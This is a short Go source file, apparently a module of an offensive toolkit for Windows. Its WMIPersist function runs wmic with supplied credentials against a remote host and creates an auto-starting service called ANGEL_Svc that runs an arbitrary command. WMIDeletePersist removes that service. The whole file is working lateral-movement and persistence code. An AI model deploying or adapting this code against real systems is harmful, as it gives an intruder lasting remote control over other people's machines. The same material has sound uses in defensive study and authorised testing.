//go:build windows

package wmi

import (
"os/exec"
)

func WMIPersist(targetHost, username, password, command string) bool {
cmd := exec.Command("cmd", "/c", "wmic /node:"+targetHost+" /user:"+username+" /password:"+password+" process call create \"sc create ANGEL_Svc binPath= '"+command+"' start= auto\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func WMIDeletePersist(targetHost, username, password string) bool {
cmd := exec.Command("cmd", "/c", "wmic /node:"+targetHost+" /user:"+username+" /password:"+password+" process call create \"sc delete ANGEL_Svc\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}
